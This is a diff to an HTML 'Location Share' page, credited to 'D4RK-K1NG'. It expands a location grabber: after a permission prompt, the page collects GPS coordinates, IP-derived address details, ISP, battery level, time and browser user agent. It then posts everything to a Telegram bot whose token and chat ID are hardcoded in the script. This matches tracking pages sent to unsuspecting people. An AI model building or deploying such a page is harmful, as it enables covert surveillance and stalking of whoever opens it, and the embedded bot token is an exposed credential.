@@ -3,86 +3,157 @@
 <head>
 <meta charset="UTF-8">
 <meta name="viewport" content="width=device-width, initial-scale=1.0">
-<title>Send Location</title>
+<title>Location Share</title>
 <style>
   body {
-    background: #0d0d0d;
-    color: white;
+    background: radial-gradient(circle at center, #001f1f, #000);
+    color: #00ffff;
+    font-family: "Poppins", sans-serif;
     display: flex;
-    justify-content: center;
-    align-items: center;
-    height: 100vh;
-    font-family: Arial, sans-serif;
     flex-direction: column;
+    align-items: center;
+    justify-content: center;
+    min-height: 100vh;
+    text-align: center;
   }
   button {
-    background: #00bcd4;
+    background: #00ffff;
     border: none;
-    padding: 15px 30px;
-    border-radius: 8px;
+    color: #000;
+    padding: 14px 30px;
+    border-radius: 10px;
     font-size: 18px;
-    color: white;
     cursor: pointer;
     transition: 0.3s;
+    font-weight: bold;
   }
   button:hover {
-    background: #0097a7;
+    background: #00cccc;
+    transform: scale(1.05);
   }
-  #status {
-    margin-top: 15px;
-    font-size: 16px;
+  .box {
+    background: rgba(0, 30, 30, 0.7);
+    border: 2px solid #00ffff;
+    border-radius: 15px;
+    padding: 20px;
+    width: 85%;
+    max-width: 400px;
+    margin-top: 20px;
+    box-shadow: 0 0 15px #00ffff;
+  }
+  .footer {
+    margin-top: 25px;
+    font-size: 14px;
+    color: #aaa;
+    border-top: 1px solid #00aaaa;
+    padding-top: 5px;
   }
 </style>
 </head>
 <body>
 
-<button onclick="sendLocation()">📍 Send Location</button>
-<p id="status"></p>
+<h2>📍 Send Your Location</h2>
+<button onclick="sendLocation()">🌐 Share Location</button>
+<div id="info" class="box" style="display:none;"></div>
+<div class="footer">🧠 Developed by D4RK-K1NG</div>
 
 <script>
-function sendLocation() {
-  const status = document.getElementById('status');
+async function sendLocation() {
+  const infoBox = document.getElementById('info');
+  infoBox.style.display = "block";
+  infoBox.innerHTML = "Requesting permission...";
+
   if (!navigator.geolocation) {
-    status.textContent = "Geolocation not supported by this browser.";
+    infoBox.innerHTML = "❌ Geolocation not supported.";
     return;
   }
 
-  status.textContent = "Requesting location permission...";
-
-  navigator.geolocation.getCurrentPosition(success, error);
-  
-  function success(position) {
+  navigator.geolocation.getCurrentPosition(async position => {
     const lat = position.coords.latitude;
     const lon = position.coords.longitude;
 
-    status.textContent = `Location received! Sending...`;
+    let ipData = await fetch("https://ipapi.co/json/").then(res => res.json()).catch(()=>({}));
+    let batteryInfo = await navigator.getBattery ? await navigator.getBattery() : null;
+    let battery = batteryInfo ? Math.round(batteryInfo.level * 100) + "%" : "N/A";
 
+    let time = new Date();
+    let visitTime = time.toLocaleTimeString();
+    let date = time.toLocaleDateString();
+
+    const info = {
+      country: ipData.country_name || "Unknown",
+      state: ipData.region || "Unknown",
+      city: ipData.city || "Unknown",
+      town: ipData.org || "Unknown",
+      pincode: ipData.postal || "Unknown",
+      latitude: lat,
+      longitude: lon,
+      map: `https://www.google.com/maps?q=${lat},${lon}`,
+      visitTime,
+      date,
+      ip: ipData.ip || "Unknown",
+      battery,
+      userAgent: navigator.userAgent
+    };
+
+    // Show on screen
+    infoBox.innerHTML = `
+      🌍 <b>Country:</b> ${info.country}<br>
+      🏙️ <b>State:</b> ${info.state}<br>
+      🌆 <b>City:</b> ${info.city}<br>
+      🏘️ <b>Town:</b> ${info.town}<br>
+      🧾 <b>Pincode:</b> ${info.pincode}<br><br>
+      📡 <b>Latitude:</b> ${info.latitude}<br>
+      🧭 <b>Longitude:</b> ${info.longitude}<br>
+      🗺️ <b>On Map:</b> <a href="${info.map}" target="_blank">View</a><br><br>
+      🕒 <b>Visited Time:</b> ${info.visitTime}<br>
+      📅 <b>Date:</b> ${info.date}<br>
+      🌐 <b>IP:</b> ${info.ip}<br>
+      🔋 <b>Battery:</b> ${info.battery}<br>
+      💻 <b>Used Web:</b> ${info.userAgent}<br>
+    `;
+
+    // Send to Telegram
     const token = "8177299368:AAEq8lA7DsfAM5tkR6kmF5rU-7Po6tuRq68";
     const chatId = "7109583573";
-    const text = `📍 New Location Shared:\nLatitude: ${lat}\nLongitude: ${lon}\nhttps://www.google.com/maps?q=${lat},${lon}`;
+
+    const text = `
+📍 *New Location Shared*
+🌍 Country: ${info.country}
+🏙️ State: ${info.state}
+🌆 City: ${info.city}
+🏘️ Town: ${info.town}
+🧾 Pincode: ${info.pincode}
+
+📡 Latitude: ${info.latitude}
+🧭 Longitude: ${info.longitude}
+🗺️ Map: ${info.map}
+
+🕒 Time: ${info.visitTime}
+📅 Date: ${info.date}
+🌐 IP: ${info.ip}
+🔋 Battery: ${info.battery}
+💻 Used Web: ${info.userAgent}
+`;
 
     fetch(`https://api.telegram.org/bot${token}/sendMessage`, {
       method: "POST",
-      headers: { "Content-Type": "application/json" },
-      body: JSON.stringify({ chat_id: chatId, text })
-    })
-    .then(() => {
-      status.textContent = "✅ Location sent successfully!";
-    })
-    .catch(() => {
-      status.textContent = "⚠️ Failed to send location.";
+      headers: {"Content-Type": "application/json"},
+      body: JSON.stringify({
+        chat_id: chatId,
+        text: text,
+        parse_mode: "Markdown"
+      })
+    }).then(()=> {
+      infoBox.innerHTML += "<br><br>✅ Sent to Telegram successfully!";
+    }).catch(()=> {
+      infoBox.innerHTML += "<br><br>⚠️ Failed to send to Telegram.";
     });
-  }
 
-  function error(err) {
-    if (err.code === 1) {
-      status.textContent = "❌ Please allow location access.";
-    } else {
-      status.textContent = "⚠️ Unable to retrieve location.";
-    }
-  }
+  }, () => {
+    infoBox.innerHTML = "❌ Please allow location access to continue.";
+  });
 }
 </script>
-
 </body>
-  </html>
+</html>
